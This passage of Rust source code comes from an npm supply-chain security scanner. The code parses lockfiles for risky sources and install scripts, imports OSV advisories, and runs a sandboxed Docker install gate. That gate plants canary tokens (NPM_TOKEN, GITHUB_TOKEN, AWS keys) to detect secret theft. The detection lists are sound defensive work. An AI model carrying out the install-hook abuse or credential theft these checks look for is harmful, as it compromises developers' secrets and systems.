    serde_json::from_str(&data).map_err(io::Error::other)
}

fn import_osv_source_records(path: &Path, source_name: &str) -> io::Result<Vec<SourceDbRecord>> {
    let mut json_files = Vec::new();
    collect_json_files(path, &mut json_files)?;
    let mut records = Vec::new();
    for json_file in json_files {
        let data = fs::read_to_string(&json_file)?;
        let value = match serde_json::from_str::<Value>(&data) {
            Ok(value) => value,
            Err(_) => continue,
        };
        if let Some(record) = source_record_from_osv_value(&value, source_name, &json_file) {
            records.push(record);
        }
    }
    records.sort_by(|left, right| {
        left.package
            .cmp(&right.package)
            .then(left.advisory_id.cmp(&right.advisory_id))
    });
    Ok(records)
}

fn collect_json_files(path: &Path, output: &mut Vec<PathBuf>) -> io::Result<()> {
    if path.is_file() {
        if path.extension().and_then(|value| value.to_str()) == Some("json") {
            output.push(path.to_path_buf());
        }
        return Ok(());
    }
    if !path.is_dir() {
        return Err(io::Error::new(
            io::ErrorKind::NotFound,
            format!("source path does not exist: {}", path.display()),
        ));
    }
    for entry in fs::read_dir(path)? {
        let entry = entry?;
        let entry_path = entry.path();
        if entry_path.is_dir() {
            collect_json_files(&entry_path, output)?;
        } else if entry_path.extension().and_then(|value| value.to_str()) == Some("json") {
            output.push(entry_path);
        }
    }
    Ok(())
}

fn source_record_from_osv_value(
    value: &Value,
    source_name: &str,
    path: &Path,
) -> Option<SourceDbRecord> {
    if value.get("withdrawn").is_some() {
        return None;
    }
    let advisory_id = value.get("id")?.as_str()?.to_string();
    let summary = value
        .get("summary")
        .and_then(Value::as_str)
        .or_else(|| value.get("details").and_then(Value::as_str))
        .unwrap_or("Source database advisory")
        .to_string();
    let aliases = value
        .get("aliases")
        .and_then(Value::as_array)
        .map(|aliases| {
            aliases
                .iter()
                .filter_map(Value::as_str)
                .map(str::to_string)
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();
    let affected = value.get("affected")?.as_array()?;
    for affected_entry in affected {
        let package = affected_entry.get("package")?.as_object()?;
        let ecosystem = package.get("ecosystem")?.as_str()?;
        if !ecosystem.eq_ignore_ascii_case("npm") {
            continue;
        }
        let package_name = package.get("name")?.as_str()?.to_lowercase();
        let versions = affected_entry
            .get("versions")
            .and_then(Value::as_array)
            .map(|versions| {
                versions
                    .iter()
                    .filter_map(Value::as_str)
                    .map(str::to_string)
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();
        let source_url = value
            .get("references")
            .and_then(Value::as_array)
            .and_then(|references| {
                references.iter().find_map(|reference| {
                    reference
                        .get("url")
                        .and_then(Value::as_str)
                        .map(str::to_string)
                })
            })
            .unwrap_or_else(|| path.display().to_string());
        return Some(SourceDbRecord {
            source: source_name.to_string(),
            source_url,
            advisory_id,
            package: package_name,
            ecosystem: "npm".to_string(),
            versions,
            severity: if source_name.to_lowercase().contains("malicious") {
                "critical".to_string()
            } else {
                "high".to_string()
            },
            confidence: "confirmed".to_string(),
            summary,
            aliases,
        });
    }
    None
}

fn format_command(program: &str, args: &[String]) -> String {
    std::iter::once(program.to_string())
        .chain(args.iter().cloned())
        .collect::<Vec<_>>()
        .join(" ")
}

fn run_paranoia_docker_gate(
    package_manager: &str,
    package_manager_args: &[String],
) -> Result<(), i32> {
    let image = env::var("MCAIFEE_PARANOIA_IMAGE")
        .unwrap_or_else(|_| default_paranoia_image(package_manager).to_string());
    let network = env::var("MCAIFEE_PARANOIA_NETWORK").unwrap_or_else(|_| "none".to_string());
    let project_dir = match env::current_dir() {
        Ok(path) => path,
        Err(error) => {
            eprintln!("mcaifee: could not resolve current directory for paranoia mode: {error}");
            return Err(1);
        }
    };
    let command = paranoia_shell_command(package_manager, package_manager_args);
    let docker_args = vec![
        "run".to_string(),
        "--rm".to_string(),
        "--network".to_string(),
        network,
        "--cap-drop".to_string(),
        "ALL".to_string(),
        "--security-opt".to_string(),
        "no-new-privileges".to_string(),
        "-v".to_string(),
        format!("{}:/workspace:ro", project_dir.display()),
        "-w".to_string(),
        "/workspace".to_string(),
        image,
        "sh".to_string(),
        "-lc".to_string(),
        command,
    ];

    println!("mcaifee: running paranoia Docker gate");
    let status = run_external_command("docker", &docker_args);
    if status == 0 {
        println!("mcaifee: paranoia Docker gate passed");
        Ok(())
    } else {
        eprintln!("mcaifee: paranoia Docker gate blocked the install simulation");
        Err(status)
    }
}

fn paranoia_shell_command(package_manager: &str, package_manager_args: &[String]) -> String {
    let package_manager_args = shell_words(package_manager_args);
    let install_command = match package_manager {
        "npm" => format!(
            "npm {} --ignore-scripts=false --foreground-scripts",
            package_manager_args
        ),
        "pnpm" => format!(
            "corepack enable pnpm >/dev/null 2>&1 || true; pnpm {}",
            package_manager_args
        ),
        "yarn" => format!(
            "corepack enable yarn >/dev/null 2>&1 || true; yarn {}",
            package_manager_args
        ),
        "bun" => format!("bun {}", package_manager_args),
        _ => format!("{package_manager} {package_manager_args}"),
    };
    format!(
        r#"
set -eu
canary="mcaifee-canary-$(date +%s)-$$"
before="$(find /tmp -mindepth 1 -maxdepth 2 -print 2>/dev/null | sort || true)"
work="$(mktemp -d /tmp/mcaifee-paranoia.XXXXXX)"
mkdir -p "$work/home" "$work/npm-cache"
export HOME="$work/home"
export npm_config_cache="$work/npm-cache"
export NPM_CONFIG_CACHE="$work/npm-cache"
export NPM_TOKEN="$canary"
export NODE_AUTH_TOKEN="$canary"
export GITHUB_TOKEN="$canary"
export AWS_ACCESS_KEY_ID="$canary"
cp -R /workspace/. "$work/project"
cd "$work/project"
if {install_command}; then
  :
else
  exit $?
fi
after="$(find /tmp -mindepth 1 -maxdepth 2 -print 2>/dev/null | sort || true)"
created="$(printf '%s\n%s\n' "$before" "$after" | sort | uniq -u | grep -v "^$work" | grep -v "^/tmp/node-compile-cache" || true)"
if [ -n "$created" ]; then
  echo "mcaifee paranoia detected files created outside project sandbox:" >&2
  echo "$created" >&2
  exit 2
fi
if grep -R "$canary" "$work/project" >/dev/null 2>&1; then
  echo "mcaifee paranoia detected canary secret material written into the project sandbox" >&2
  exit 2
fi
"#
    )
}

fn default_paranoia_image(package_manager: &str) -> &'static str {
    if package_manager == "bun" {
        "oven/bun:1"
    } else {
        "node:22-bookworm-slim"
    }
}

fn shell_words(args: &[String]) -> String {
    args.iter()
        .map(|arg| shell_quote(arg))
        .collect::<Vec<_>>()
        .join(" ")
}

fn shell_quote(value: &str) -> String {
    if value.chars().all(|ch| {
        ch.is_ascii_alphanumeric() || matches!(ch, '-' | '_' | '.' | '/' | ':' | '@' | '+')
    }) {
        value.to_string()
    } else {
        format!("'{}'", value.replace('\'', "'\\''"))
    }
}

fn run(args: Args) -> i32 {
    let allowed_hosts: HashSet<String> = args
        .allow_registry_host
        .iter()
        .map(|host| host.to_lowercase())
        .collect();
    let source_db = load_default_source_db();
    let mut findings = Vec::new();
    let mut scopes = Vec::new();

    if let Some(path) = &args.package_json {
        scopes.push(path.display().to_string());
        if path.exists() {
            analyze_package_json(path, &mut findings, args.strict_ranges, source_db.as_ref());
        } else {
            add_finding(
                &mut findings,
                Severity::High,
                path.display().to_string(),
                "missing_package_json",
                "package.json path does not exist.",
                None,
            );
        }
    }

    if let Some(path) = &args.lockfile {
        scopes.push(path.display().to_string());
        if path.exists() {
            analyze_lockfile(path, &mut findings, &allowed_hosts, source_db.as_ref());
        } else {
            add_finding(
                &mut findings,
                Severity::High,
                path.display().to_string(),
                "missing_lockfile",
                "Lockfile path does not exist.",
                None,
            );
        }
    }

    for spec in &args.targets {
        scopes.push(spec.clone());
        let name = package_name_from_spec(spec);
        add_source_db_findings(
            source_db.as_ref(),
            &name,
            exact_version_from_spec(spec).as_deref(),
            spec,
            &mut findings,
        );
        if args.online {
            analyze_online_spec(spec, &mut findings, &allowed_hosts, args.timeout);
        } else {
            analyze_package_name(&name, &mut findings, spec);
            if is_non_registry_spec(spec) {
                let severity = if spec.to_lowercase().starts_with("http:") {
                    Severity::Critical
                } else {
                    Severity::High
                };
                add_finding(
                    &mut findings,
                    severity,
                    spec,
                    "non_registry_spec",
                    "Package spec bypasses normal npm registry resolution.",
                    None,
                );
            }
        }
    }

    match args.format {
        OutputFormat::Json => {
            let output = JsonOutput {
                tool: "mcaifee",
                scope: scopes.clone(),
                highest_risk: highest_severity(&findings),
                findings: findings.clone(),
            };
            println!(
                "{}",
                serde_json::to_string_pretty(&output).expect("serialize output")
            );
        }
        OutputFormat::Text => println!("{}", render_text(&findings, &scopes)),
    }

    if let Some(threshold) = args.fail_on {
        if findings
            .iter()
            .any(|finding| finding.severity.score() >= threshold.score())
        {
            return 2;
        }
    }
    0
}

fn run_report(args: ReportArgs) -> i32 {
    let allowed_hosts: HashSet<String> = args
        .allow_registry_host
        .iter()
        .map(|host| host.to_lowercase())
        .collect();
    let source_db = load_default_source_db();
    let mut findings = Vec::new();
    let mut scope = Vec::new();

    let package_json_summary = if args.package_json.exists() {
        scope.push(args.package_json.display().to_string());
        analyze_package_json(&args.package_json, &mut findings, false, source_db.as_ref());
        summarize_package_json(&args.package_json)
    } else {
        None
    };

    let lockfiles = if let Some(lockfile) = &args.lockfile {
        vec![lockfile.clone()]
    } else {
        default_lockfile_candidates()
    };
    let mut lockfile_summaries = Vec::new();
    for lockfile in lockfiles {
        if lockfile.exists() {
            scope.push(lockfile.display().to_string());
            analyze_lockfile(&lockfile, &mut findings, &allowed_hosts, source_db.as_ref());
        }
        lockfile_summaries.push(summarize_lockfile(&lockfile, &allowed_hosts));
    }

    for spec in &args.targets {
        scope.push(spec.clone());
        let name = package_name_from_spec(spec);
        add_source_db_findings(
            source_db.as_ref(),
            &name,
            exact_version_from_spec(spec).as_deref(),
            spec,
            &mut findings,
        );
        if args.online && !is_non_registry_spec(spec) {
            analyze_online_spec(spec, &mut findings, &allowed_hosts, args.timeout);
        } else {
            analyze_package_name(&name, &mut findings, spec);
            if is_non_registry_spec(spec) {
                add_finding(
                    &mut findings,
                    if spec.to_lowercase().starts_with("http:") {
                        Severity::Critical
                    } else {
                        Severity::High
                    },
                    spec,
                    "non_registry_spec",
                    "Package spec bypasses normal npm registry resolution.",
                    None,
                );
            }
        }
    }

    let report = ReportOutput {
        tool: "mcaifee",
        mode: "report",
        scope,
        highest_risk: highest_severity(&findings),
        summary: severity_counts(&findings),
        package_json: package_json_summary,
        lockfiles: lockfile_summaries,
        package_specs: args.targets,
        findings,
        sources: source_catalog(args.online, source_db.as_ref()),
        recommended_next_steps: recommended_next_steps(args.online, args.paranoia),
        paranoia: args.paranoia.then(|| ParanoiaSummary {
            enabled: true,
            image: env::var("MCAIFEE_PARANOIA_IMAGE")
                .unwrap_or_else(|_| "node:22-bookworm-slim".to_string()),
            network: env::var("MCAIFEE_PARANOIA_NETWORK").unwrap_or_else(|_| "none".to_string()),
            note: "Run `mcaifee npm install --paranoia` to execute the Docker behavior gate."
                .to_string(),
        }),
    };

    match args.format {
        OutputFormat::Json => {
            println!(
                "{}",
                serde_json::to_string_pretty(&report).expect("serialize report")
            );
        }
        OutputFormat::Text => {
            println!("{}", render_report_text(&report));
        }
    }
    0
}

fn summarize_package_json(path: &PathBuf) -> Option<ManifestSummary> {
    let data = fs::read_to_string(path).ok()?;
    let value: Value = serde_json::from_str(&data).ok()?;
    let root = value.as_object()?;
    let mut dependency_counts = HashMap::new();
    for section in [
        "dependencies",
        "optionalDependencies",
        "peerDependencies",
        "devDependencies",
    ] {
        if let Some(count) = root
            .get(section)
            .and_then(Value::as_object)
            .map(|deps| deps.len())
        {
            dependency_counts.insert(section.to_string(), count);
        }
    }
    let lifecycle_scripts = root
        .get("scripts")
        .and_then(Value::as_object)
        .map(|scripts| {
            scripts
                .keys()
                .filter(|name| {
                    matches!(
                        name.as_str(),
                        "preinstall"
                            | "install"
                            | "postinstall"
                            | "prepublish"
                            | "prepublishOnly"
                            | "prepare"
                            | "prepack"
                            | "postpack"
                    )
                })
                .cloned()
                .collect()
        })
        .unwrap_or_default();
    Some(ManifestSummary {
        path: path.display().to_string(),
        name: root.get("name").and_then(Value::as_str).map(str::to_string),
        version: root
            .get("version")
            .and_then(Value::as_str)
            .map(str::to_string),
        dependency_counts,
        lifecycle_scripts,
    })
}

fn default_lockfile_candidates() -> Vec<PathBuf> {
    vec![
        PathBuf::from("npm-shrinkwrap.json"),
        PathBuf::from("package-lock.json"),
        PathBuf::from("pnpm-lock.yaml"),
        PathBuf::from("yarn.lock"),
        PathBuf::from("bun.lock"),
        PathBuf::from("bun.lockb"),
    ]
}

fn summarize_lockfile(path: &PathBuf, allowed_hosts: &HashSet<String>) -> LockfileSummary {
    if !path.exists() {
        return LockfileSummary {
            path: path.display().to_string(),
            exists: false,
            package_count: 0,
            install_script_count: 0,
            non_registry_sources: 0,
        };
    }
    if !is_npm_json_lockfile(path) {
        if let Some(signals) = parse_text_lockfile_signals(path, allowed_hosts) {
            return LockfileSummary {
                path: path.display().to_string(),
                exists: true,
                package_count: signals.package_count,
                install_script_count: signals.install_script_count,
                non_registry_sources: signals.non_registry_sources,
            };
        }
        return LockfileSummary {
            path: path.display().to_string(),
            exists: true,
            package_count: 0,
            install_script_count: 0,
            non_registry_sources: 0,
        };
    }
    let value = fs::read_to_string(path)
        .ok()
        .and_then(|data| serde_json::from_str::<Value>(&data).ok())
        .unwrap_or(Value::Null);
    let mut package_count = 0;
    let mut install_script_count = 0;
    let mut non_registry_sources = 0;
    if let Some(packages) = value.get("packages").and_then(Value::as_object) {
        for (lock_path, meta) in packages {
            if lock_path.is_empty() {
                continue;
            }
            package_count += 1;
            if meta.get("hasInstallScript").and_then(Value::as_bool) == Some(true) {
                install_script_count += 1;
            }
            if meta
                .get("resolved")
                .and_then(Value::as_str)
                .is_some_and(|resolved| {
                    resolved.starts_with("http://")
                        || resolved.starts_with("git:")
                        || resolved.starts_with("git+")
                        || resolved.starts_with("ssh:")
                        || (resolved.starts_with("https://")
                            && !host_allowed(resolved, allowed_hosts))
                })
            {
                non_registry_sources += 1;
            }
        }
    }
    LockfileSummary {
        path: path.display().to_string(),
        exists: true,
        package_count,
        install_script_count,
        non_registry_sources,
    }
}

#[derive(Debug, Default)]
struct TextLockfileSignals {
    packages: Vec<TextLockPackage>,
    package_count: usize,
    install_script_count: usize,
    non_registry_sources: usize,
}

#[derive(Debug, Default)]
struct TextLockPackage {
    target: String,
    name: Option<String>,
    version: Option<String>,
    source: Option<String>,
    integrity_present: bool,
    install_script: bool,
    has_bin: bool,
    local_source: Option<String>,
}

fn is_npm_json_lockfile(path: &Path) -> bool {
    path.extension().and_then(|value| value.to_str()) == Some("json")
}

fn is_bun_binary_lockfile(path: &Path) -> bool {
    path.file_name().and_then(|value| value.to_str()) == Some("bun.lockb")
}

fn parse_text_lockfile_signals(
    path: &Path,
    allowed_hosts: &HashSet<String>,
) -> Option<TextLockfileSignals> {
    let file_name = path.file_name()?.to_str()?;
    let data = fs::read_to_string(path).ok()?;
    match file_name {
        "pnpm-lock.yaml" | "pnpm-lock.yml" => {
            Some(parse_pnpm_lockfile_signals(path, &data, allowed_hosts))
        }
        "yarn.lock" => Some(parse_yarn_lockfile_signals(path, &data, allowed_hosts)),
        "bun.lock" => Some(parse_bun_lockfile_signals(path, &data, allowed_hosts)),
        _ => None,
    }
}

fn parse_pnpm_lockfile_signals(
    path: &Path,
    data: &str,
    allowed_hosts: &HashSet<String>,
) -> TextLockfileSignals {
    let mut signals = TextLockfileSignals::default();
    let mut in_packages = false;
    let mut current: Option<TextLockPackage> = None;

    for line in data.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if !line.starts_with(' ') {
            flush_text_package(&mut signals, current.take(), allowed_hosts);
            in_packages = trimmed == "packages:";
            continue;
        }
        if !in_packages {
            continue;
        }
        if line.starts_with("  ") && !line.starts_with("    ") && trimmed.ends_with(':') {
            flush_text_package(&mut signals, current.take(), allowed_hosts);
            let key = clean_lock_value(trimmed.trim_end_matches(':'));
            let name = package_name_from_lock_descriptor(&key);
            let version = version_from_lock_descriptor(&key, name.as_deref());
            current = Some(TextLockPackage {
                target: format!("{}:{key}", path.display()),
                name,
                version,
                source: extract_source_token(&key),
                ..TextLockPackage::default()
            });
            continue;
        }
        let Some(package) = current.as_mut() else {
            continue;
        };
        if trimmed.starts_with("resolution:") {
            if let Some(source) = extract_source_token(trimmed) {
                package.source = Some(source);
            }
            if inline_lock_field(trimmed, "integrity").is_some() {
                package.integrity_present = true;
            }
            if let Some(tarball) = inline_lock_field(trimmed, "tarball") {
                package.source = Some(tarball);
            }
        } else if let Some(tarball) = yaml_lock_value(trimmed, "tarball") {
            package.source = Some(tarball);
        } else if yaml_lock_value(trimmed, "integrity").is_some() {
            package.integrity_present = true;
        } else if yaml_bool_value(trimmed, "requiresBuild")
            || yaml_bool_value(trimmed, "hasInstallScript")
        {
            package.install_script = true;
        } else if yaml_bool_value(trimmed, "hasBin") {
            package.has_bin = true;
        }
    }
    flush_text_package(&mut signals, current.take(), allowed_hosts);
    signals
}

fn parse_yarn_lockfile_signals(
    path: &Path,
    data: &str,
    allowed_hosts: &HashSet<String>,
) -> TextLockfileSignals {
    let mut signals = TextLockfileSignals::default();
    let mut current: Option<TextLockPackage> = None;

    for line in data.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if !line.starts_with(' ') && trimmed.ends_with(':') {
            flush_text_package(&mut signals, current.take(), allowed_hosts);
            let key = clean_lock_value(trimmed.trim_end_matches(':'));
            if key == "__metadata" {
                continue;
            }
            let name = package_name_from_lock_descriptor(&key);
            let version = version_from_lock_descriptor(&key, name.as_deref());
            current = Some(TextLockPackage {
                target: format!("{}:{key}", path.display()),
                name,
                version,
                source: extract_source_token(&key),
                ..TextLockPackage::default()
            });
            continue;
        }
        let Some(package) = current.as_mut() else {
            continue;
        };
        if let Some(resolved) =
            yarn_space_value(trimmed, "resolved").or_else(|| yaml_lock_value(trimmed, "resolution"))
        {
            if let Some(source) = extract_source_token(&resolved) {
                package.source = Some(source);
            } else if resolved.starts_with("http://")
                || resolved.starts_with("https://")
                || resolved.starts_with("git:")
                || resolved.starts_with("git+")
                || resolved.starts_with("ssh:")
            {
                package.source = Some(resolved);
            }
        } else if yaml_lock_value(trimmed, "integrity").is_some()
            || yaml_lock_value(trimmed, "checksum").is_some()
        {
            package.integrity_present = true;
        } else if let Some(version) =
            yarn_space_value(trimmed, "version").or_else(|| yaml_lock_value(trimmed, "version"))
        {
            package.version = Some(version);
        } else if trimmed == "bin:" {
            package.has_bin = true;
        } else if yaml_bool_value(trimmed, "built") || yaml_bool_value(trimmed, "requiresBuild") {
            package.install_script = true;
        }
    }
    flush_text_package(&mut signals, current.take(), allowed_hosts);
    signals
}

fn parse_bun_lockfile_signals(
    path: &Path,
    data: &str,
    allowed_hosts: &HashSet<String>,
) -> TextLockfileSignals {
    let mut signals = TextLockfileSignals::default();
    let mut current: Option<TextLockPackage> = None;

    for line in data.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with("//") || trimmed.starts_with('#') {
            continue;
        }
        if let Some(key) = quoted_key_before_colon(trimmed) {
            let package_like_entry = trimmed.contains(": [")
                || trimmed.contains(":[")
                || key.contains("@npm:")
                || key.contains("@patch:")
                || key.contains("@workspace:")
                || extract_source_token(&key).is_some();
            if package_like_entry && !matches!(key.as_str(), "lockfileVersion" | "workspaces") {
                flush_text_package(&mut signals, current.take(), allowed_hosts);
                let name = package_name_from_lock_descriptor(&key);
                let version = version_from_lock_descriptor(&key, name.as_deref());
                current = Some(TextLockPackage {
                    target: format!("{}:{key}", path.display()),
                    name,
                    version,
                    source: extract_source_token(&key),
                    ..TextLockPackage::default()
                });
            }
        }
        let Some(package) = current.as_mut() else {
            continue;
        };
        if let Some(source) = extract_source_token(trimmed) {
            package.source = Some(source);
        }
        if package.version.is_none() {
            package.version = version_from_lock_descriptor(trimmed, package.name.as_deref());
        }
        let lowered = trimmed.to_lowercase();
        if lowered.contains("sha512-")
            || lowered.contains("sha384-")
            || lowered.contains("sha256-")
            || lowered.contains("sha1-")
            || lowered.contains("integrity")
            || lowered.contains("checksum")
        {
            package.integrity_present = true;
        }
        if lowered.contains("\"bin\"") || lowered.contains("'bin'") {
            package.has_bin = true;
        }
        if lowered.contains("preinstall")
            || lowered.contains("postinstall")
            || lowered.contains("\"install\"")
            || lowered.contains("'install'")
            || lowered.contains("requiresbuild")
            || lowered.contains("trusteddependencies")
        {
            package.install_script = true;
        }
    }
    flush_text_package(&mut signals, current.take(), allowed_hosts);
    signals
}

fn flush_text_package(
    signals: &mut TextLockfileSignals,
    package: Option<TextLockPackage>,
    allowed_hosts: &HashSet<String>,
) {
    let Some(package) = package else {
        return;
    };
    if package.name.is_none() && package.source.is_none() && package.local_source.is_none() {
        return;
    }
    signals.package_count += 1;
    if package.install_script {
        signals.install_script_count += 1;
    }
    if package
        .source
        .as_deref()
        .is_some_and(|source| text_source_is_non_registry(source, allowed_hosts))
        || package.local_source.is_some()
    {
        signals.non_registry_sources += 1;
    }
    signals.packages.push(package);
}

fn analyze_text_lockfile_signals(
    signals: TextLockfileSignals,
    findings: &mut Vec<Finding>,
    allowed_hosts: &HashSet<String>,
    source_db: Option<&SourceDb>,
) {
    let mut seen_names: HashMap<String, usize> = HashMap::new();
    for package in signals.packages {
        if let Some(name) = &package.name {
            *seen_names.entry(name.clone()).or_default() += 1;
            analyze_package_name(name, findings, &package.target);
            add_source_db_findings(
                source_db,
                name,
                package.version.as_deref(),
                &package.target,
                findings,
            );
        }
        if let Some(source) = &package.source {
            analyze_resolved_url(source, &package.target, findings, allowed_hosts);
            if (source.starts_with("http://") || source.starts_with("https://"))
                && !package.integrity_present
            {
                add_finding(
                    findings,
                    Severity::High,
                    &package.target,
                    "missing_integrity",
                    "Registry tarball has no integrity hash in the lockfile.",
                    Some(source.to_string()),
                );
            }
        }
        if let Some(local_source) = &package.local_source {
            add_finding(
                findings,
                Severity::Medium,
                &package.target,
                "local_or_workspace_dependency",
                "Dependency resolves from local/workspace path; verify it is expected.",
                Some(local_source.to_string()),
            );
        }
        if package.install_script {
            add_finding(
                findings,
                Severity::Medium,
                &package.target,
                "lockfile_install_script",
                "Lockfile marks this package as having an install lifecycle script.",
                None,
            );
        }
        if package.has_bin {
            add_finding(
                findings,
                Severity::Low,
                &package.target,
                "lockfile_bin",
                "Package exposes executable binaries; verify CLI behavior before trusting it.",
                None,
            );
        }
    }
    for (name, count) in seen_names {
        if count >= 4 {
            add_finding(
                findings,
                Severity::Low,
                name,
                "many_duplicate_versions",
                "Package appears in several lockfile locations; review version fanout.",
                Some(count.to_string()),
            );
        }
    }
}

fn clean_lock_value(value: &str) -> String {
    let value = value.trim().trim_end_matches(',').trim();
    let value = value
        .strip_prefix('"')
        .and_then(|inner| inner.strip_suffix('"'))
        .or_else(|| {
            value
                .strip_prefix('\'')
                .and_then(|inner| inner.strip_suffix('\''))
        })
        .unwrap_or(value);
    value.to_string()
}

fn yaml_lock_value(line: &str, key: &str) -> Option<String> {
    let rest = line.trim().strip_prefix(key)?.trim_start();
    let rest = rest.strip_prefix(':')?.trim();
    if rest.is_empty() {
        None
    } else {
        Some(clean_lock_value(rest))
    }
}

fn yaml_bool_value(line: &str, key: &str) -> bool {
    yaml_lock_value(line, key).is_some_and(|value| value.eq_ignore_ascii_case("true"))
}

fn yarn_space_value(line: &str, key: &str) -> Option<String> {
    let rest = line.trim().strip_prefix(key)?.trim_start();
    if rest.is_empty() || rest.starts_with(':') {
        None
    } else {
        Some(clean_lock_value(rest))
    }
}

fn quoted_key_before_colon(line: &str) -> Option<String> {
    let rest = line.trim_start().strip_prefix('"')?;
    let end = rest.find('"')?;
    let after = rest[end + 1..].trim_start();
    if after.starts_with(':') {
        Some(clean_lock_value(&rest[..end]))
    } else {
        None
    }
}

fn inline_lock_field(line: &str, key: &str) -> Option<String> {
    let marker = format!("{key}:");
    let start = line.find(&marker)? + marker.len();
    let rest = line[start..].trim();
    let end = rest.find([',', '}']).unwrap_or(rest.len());
    Some(clean_lock_value(&rest[..end]))
}

fn package_name_from_lock_descriptor(descriptor: &str) -> Option<String> {
    let descriptor = clean_lock_value(descriptor)
        .split(',')
        .next()
        .unwrap_or("")
        .trim()
        .trim_start_matches('/')
        .to_string();
    if descriptor.is_empty() {
        return None;
    }
    if descriptor.starts_with('@') {
        let slash = descriptor.find('/')?;
        let after_name = descriptor[slash + 1..]
            .find(['@', '/', '('])
            .map(|index| slash + 1 + index)
            .unwrap_or(descriptor.len());
        Some(descriptor[..after_name].to_string())
    } else {
        let end = descriptor.find(['@', '/', '(']).unwrap_or(descriptor.len());
        if end == 0 {
            None
        } else {
            Some(descriptor[..end].to_string())
        }
    }
}

fn version_from_lock_descriptor(descriptor: &str, package_name: Option<&str>) -> Option<String> {
    let descriptor = clean_lock_value(descriptor);
    if let Some(name) = package_name {
        let npm_marker = format!("{name}@npm:");
        if let Some(start) = descriptor.find(&npm_marker) {
            return clean_version_token(&descriptor[start + npm_marker.len()..]);
        }
        if let Some(rest) = descriptor
            .strip_prefix(name)
            .and_then(|rest| rest.strip_prefix('@'))
        {
            return clean_version_token(rest);
        }
        let scoped_path = format!("/{name}@");
        if let Some(start) = descriptor.find(&scoped_path) {
            return clean_version_token(&descriptor[start + scoped_path.len()..]);
        }
    }
    if let Some(start) = descriptor.find("@npm:") {
        return clean_version_token(&descriptor[start + "@npm:".len()..]);
    }
    None
}

fn clean_version_token(value: &str) -> Option<String> {
    let end = value
        .find(['"', '\'', ',', ')', '}', ']', ' ', '\t', '\n'])
        .unwrap_or(value.len());
    let version = clean_lock_value(&value[..end]);
    if version.is_empty() || is_broad_range(&version) {
        None
    } else {
        Some(version)
    }
}

fn extract_source_token(value: &str) -> Option<String> {
    let lowered = value.to_lowercase();
    let start = [
        "http://",
        "https://",
        "git+",
        "git:",
        "github:",
        "gitlab:",
        "bitbucket:",
        "ssh:",
        "file:",
        "link:",
        "workspace:",
        "patch:",
    ]
    .into_iter()
    .filter_map(|needle| lowered.find(needle))
    .min()?;
    let token = &value[start..];
    let end = token
        .find(['"', '\'', ',', ')', '}', ' ', '\t'])
        .unwrap_or(token.len());
    Some(clean_lock_value(&token[..end]))
}

fn text_source_is_non_registry(source: &str, allowed_hosts: &HashSet<String>) -> bool {
    let lowered = source.to_lowercase();
    lowered.starts_with("http://")
        || lowered.starts_with("git:")
        || lowered.starts_with("git+")
        || lowered.starts_with("github:")
        || lowered.starts_with("gitlab:")
        || lowered.starts_with("bitbucket:")
        || lowered.starts_with("ssh:")
        || lowered.starts_with("file:")
        || lowered.starts_with("link:")
        || lowered.starts_with("workspace:")
        || lowered.starts_with("patch:")
        || (lowered.starts_with("https://") && !lockfile_host_allowed(source, allowed_hosts))
}

fn lockfile_host_allowed(url: &str, allowed_hosts: &HashSet<String>) -> bool {
    if host_allowed(url, allowed_hosts) {
        return true;
    }
    Url::parse(url)
        .ok()
        .and_then(|parsed| parsed.host_str().map(str::to_lowercase))
        .is_some_and(|host| host == "registry.yarnpkg.com")
}

fn source_catalog(online: bool, source_db: Option<&SourceDb>) -> Vec<SourceSummary> {
    let online_status = if online {
        "queried-when-applicable"
    } else {
        "available"
    };
    vec![
        SourceSummary {
            name: "local heuristics",
            category: "static",
            status: "queried",
            url: "local",
        },
        SourceSummary {
            name: "Mcaifee source DB",
            category: "local-cache",
            status: if source_db.is_some() {
                "queried"
            } else {
                "missing-run-db-update"
            },
            url: "local",
        },
        SourceSummary {
            name: "npm registry metadata",
            category: "registry",
            status: online_status,
            url: "https://registry.npmjs.org/",
        },
        SourceSummary {
            name: "npm audit",
            category: "vulnerability",
            status: "recommended",
            url: "https://docs.npmjs.com/cli/commands/npm-audit/",
        },
        SourceSummary {
            name: "OSV.dev",
            category: "vulnerability",
            status: "recommended",
            url: "https://osv.dev/",
        },
        SourceSummary {
            name: "OpenSSF malicious-packages",
            category: "malware",
            status: "recommended",
            url: "https://github.com/ossf/malicious-packages",
        },
        SourceSummary {
            name: "GitHub Advisory Database",
            category: "vulnerability-malware",
            status: "recommended",
            url: "https://github.com/advisories",
        },
        SourceSummary {
            name: "GitLab Advisory Database",
            category: "vulnerability",
            status: "optional",
            url: "https://gitlab.com/gitlab-org/advisories-community",
        },
        SourceSummary {
            name: "deps.dev",
            category: "metadata",
            status: "optional",
            url: "https://deps.dev/",
        },
        SourceSummary {
            name: "OpenSSF Scorecard",
            category: "repository-health",
            status: "optional",
            url: "https://scorecard.dev/",
        },
        SourceSummary {
            name: "Socket.dev",
            category: "supply-chain-intel",
            status: "optional",
            url: "https://socket.dev/",
        },
        SourceSummary {
            name: "Snyk Vulnerability DB",
            category: "vulnerability",
            status: "optional",
            url: "https://security.snyk.io/",
        },
        SourceSummary {
            name: "Sonatype OSS Index",
            category: "vulnerability",
            status: "optional",
            url: "https://ossindex.sonatype.org/",
        },
        SourceSummary {
            name: "CISA KEV",
            category: "exploitation",
            status: "optional",
            url: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
        },
        SourceSummary {
            name: "NVD",
            category: "cve",
            status: "optional",
            url: "https://nvd.nist.gov/",
        },
        SourceSummary {
            name: "Mend/Renovate datasource metadata",
            category: "metadata",
            status: "optional",
            url: "https://docs.renovatebot.com/modules/datasource/",
        },
        SourceSummary {
            name: "Phylum research",
            category: "supply-chain-intel",
            status: "corroborating",
            url: "https://www.phylum.io/research/",
        },
        SourceSummary {
            name: "ReversingLabs research",
            category: "supply-chain-intel",
            status: "corroborating",
            url: "https://www.reversinglabs.com/blog",
        },
        SourceSummary {
            name: "Checkmarx Supply Chain Security",
            category: "supply-chain-intel",
            status: "corroborating",
            url: "https://checkmarx.com/blog/",
        },
        SourceSummary {
            name: "JFrog security research",
            category: "supply-chain-intel",
            status: "corroborating",
